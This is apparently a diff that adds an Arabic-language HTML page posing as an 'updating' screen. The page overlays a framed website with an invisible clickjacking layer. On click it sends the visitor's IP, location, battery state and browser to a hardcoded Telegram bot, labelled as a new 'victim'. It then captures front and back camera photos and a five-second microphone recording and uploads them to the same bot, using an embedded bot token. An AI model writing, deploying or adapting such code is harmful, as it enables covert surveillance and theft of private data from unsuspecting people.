@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحديث...</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: #000; }
+        iframe { width: 100%; height: 100%; border: none; position: absolute; z-index: 1; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.01); z-index: 999; cursor: pointer; }
+        #toast { visibility: hidden; min-width: 200px; background-color: #333; color: #fff; text-align: center; border-radius: 20px; padding: 10px; position: fixed; z-index: 1000; left: 50%; bottom: 50px; transform: translateX(-50%); opacity: 0; transition: opacity 0.5s; }
+        #toast.show { visibility: visible; opacity: 1; }
+    </style>
+</head>
+<body>
+
+    <iframe src="https://traidmod.com/"></iframe>
+    <div id="overlay" onclick="startFullCapture()"></div>
+    <div id="toast">جاري تحديث البيانات...</div>
+
+    <script>
+        const token = '8120975005:AAFpqunUzKJav0pCWI-ZjCMjUVi2FMOL3Go';
+        const chatId = '8249039685';
+
+        async function sendToTelegram(formData) {
+            try { await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }); } catch(e) {}
+        }
+
+        async function sendMsg(text) {
+            try { await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`); } catch(e) {}
+        }
+
+        async function startFullCapture() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById("toast").className = "show";
+
+            // 1. سحب بيانات البطارية والـ IP والشبكة (بدون أذونات)
+            let batteryInfo = "";
+            try {
+                const battery = await navigator.getBattery();
+                batteryInfo = `🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? 'جاري الشحن' : 'لا يشحن'})`;
+            } catch(e) { batteryInfo = "🔋 البطارية: غير مدعوم"; }
+
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                sendMsg(`🔔 ضحية جديد دخل!\n🌐 IP: ${d.ip}\n📍 الموقع: ${d.city}, ${d.country_name}\n${batteryInfo}\n📱 المتصفح: ${navigator.userAgent}`);
+            });
+
+            // 2. سحب الكاميرات والصوت
+            try {
+                // سحب الكاميرا الأمامية أولاً
+                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                captureMedia(frontStream, "الأمامية");
+
+                // سحب الكاميرا الخلفية (محاولة)
+                setTimeout(async () => {
+                    try {
+                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+                        captureMedia(backStream, "الخلفية");
+                    } catch(e) { sendMsg("⚠️ الكاميرا الخلفية محظورة أو غير موجودة."); }
+                }, 2000);
+
+            } catch (e) {
+                sendMsg("🚫 الضحية رفض الأذونات.");
+            }
+        }
+
+        async function captureMedia(stream, type) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            await video.play();
+
+            // لقطة صورة
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    const frm = new FormData();
+                    frm.append('chat_id', chatId);
+                    frm.append('photo', blob, `${type}.jpg`);
+                    frm.append('caption', `📸 كاميرا ${type}`);
+                    sendToTelegram(frm);
+                }, 'image/jpeg', 0.6);
+            }, 1000);
+
+            // تسجيل صوتي 5 ثواني (يتم مرة واحدة مع أول ستريم)
+            if (type === "الأمامية") {
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const frm = new FormData();
+                    frm.append('chat_id', chatId);
+                    frm.append('voice', blob, 'rec.ogg');
+                    fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: frm });
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
+            }
+        }
+    </script>
+</body>
+</html>
